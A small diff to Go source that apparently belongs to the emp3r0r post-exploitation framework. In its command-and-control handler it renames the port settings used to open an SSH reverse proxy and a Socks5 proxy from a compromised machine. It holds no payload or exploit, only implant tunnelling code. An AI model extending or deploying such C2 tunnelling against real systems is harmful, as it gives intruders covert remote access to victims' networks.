@@ -74,9 +74,9 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 				cancelfunc() // cancel existing connection
 			}
 		}
-		addrWithPort := *addr + ":" + RuntimeConfig.SSHProxyPort
+		targetAddrWithPort := *addr + ":" + RuntimeConfig.ReverseProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
-		if err = tun.SSHReverseProxyClient(addrWithPort, RuntimeConfig.Password,
+		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
 			&ReverseConns,
 			emp3r0r_data.ProxyServer,
 			ctx, cancel); err != nil {
@@ -139,7 +139,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
 		}
 		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
-			RuntimeConfig.ShadowsocksPort,
+			RuntimeConfig.ShadowsocksLocalSocksPort,
 			RuntimeConfig.Password)
 		return
 
